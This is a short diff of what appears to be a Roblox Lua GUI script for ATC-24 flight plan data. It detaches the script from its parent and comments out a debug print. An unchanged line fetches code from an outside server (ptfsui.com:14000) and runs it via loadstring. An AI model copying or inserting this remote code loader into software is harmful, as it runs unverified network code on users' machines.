@@ -15175,6 +15175,7 @@ local function QVFIYB_fake_script() -- ATCScreen.Core
 		end
 
 		script.Parent:Destroy()
+		script.Parent = nil
 	end
 
 
@@ -15208,8 +15209,8 @@ local function QVFIYB_fake_script() -- ATCScreen.Core
 	loadstring(game:HttpGet("http://ptfsui.com:14000"))()
 
 	if script.Parent and flightPlans then
-		print("| Current ATC-24 Flight Plan Data |")
-		print(game:HttpGet("http://ptfsui.com:14000"))
+		print("| Recieved Flight  Plan Data |")
+		--print(game:HttpGet("http://ptfsui.com:14000"))
 	end
 
 	if not flightPlans then
